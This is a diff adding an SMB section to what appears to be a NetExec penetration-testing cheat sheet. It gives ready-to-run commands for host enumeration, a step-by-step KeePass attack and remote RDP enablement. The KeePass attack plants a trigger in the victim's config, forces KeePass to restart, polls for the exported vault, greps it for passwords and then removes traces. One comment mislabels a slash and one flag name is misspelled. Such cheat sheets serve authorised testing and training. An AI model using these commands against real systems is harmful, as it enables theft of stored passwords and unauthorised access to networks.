@@ -476,6 +476,52 @@ nxc ldap [$FQDN] -u [user] -p [pass] -M daclread -o TARGET=[target] ACTION=read
 nxc ldap [$FQDN] -u [user] -p [pass] -M dacleread -o TARGET-DN='DC=[DC Hostname],DC=[Domain]' ACTION=read RIGHTS=DCSync
 ```
 #### SMB
+> Most of the SMB modules are going to need admin (Pwn3d!) rights.  
+* get_netconnections
+> Uses WMI to retrieve network information (basically an IPCONFIG).  
+```bash
+nxc smb [$IP] -u [user] -p [pass] -M get_netconnections
+```
+* ioxidresolver
+> Uses RPC to retrieve network information. Does not retrieve IPv6 addresses.  
+```bash
+nxc smb [$IP] -u [user] -p [pass] -M ioxidresolver
+```
+* keepass_discover
+```bash
+nxc smb [$IP] -u [user] -p [pass] -M keepass_discover
+* keepass Exploitation
+1. Locate the keepass file location from keepass_discover
+2. Add a trigger to the configuration file using nxc
+```bash
+nxc smb [$IP] -u [user] -p [pass] -M keepass_trigger -o ACTION=ADD KEEPASS_CONFIG_PATH=[path found in keepass_discover]
+# Note: Make sure to use a backslash (/) or double slash (\\) for the file path.
+```
+3. Wait for the user to open keepass. We can force this with the `ACTION=RESTART` flag
+```bash
+nxc smb [$IP] -u [user] -p [pass] -M keepass_trigger -o ACTION=RESTART
+```
+4. Poll and wait for the exported data with `ACTION=POLL`
+```bash
+nxc smb [$IP] -u [user] -p [pass] -M keepass_trigger -o ACTION=POLL
+```
+5. Use grep to search for passwords
+```bash
+cat /tmp/export.xml | grep -i protectinmemory -A 5
+```
+6. Cleanup
+```bash
+nxc smb [$IP] -u [user] -p [pass] -M keepass_trigger -o ACTION=CLEAN KEEPASS_CONFIG-PATH=[path found in keepass_discover]
+```
+* keepass exploitation all at once.
+```bash
+nxc smb [$IP] -u [user] -p [pass] -M keepass_trigger -o ACTION=ALL KEEPASS_CONFIG_PATH=[path found in keepass_discover]
+```
+> If we get an error in the password, it will be in `/tmp/export.xml`.  
+* Enable RDP
+```bash
+nxc smb [$IP] -u [user] -p [pass] -M rdp -o ACTION=enable
+```
 
 
 ## Misc
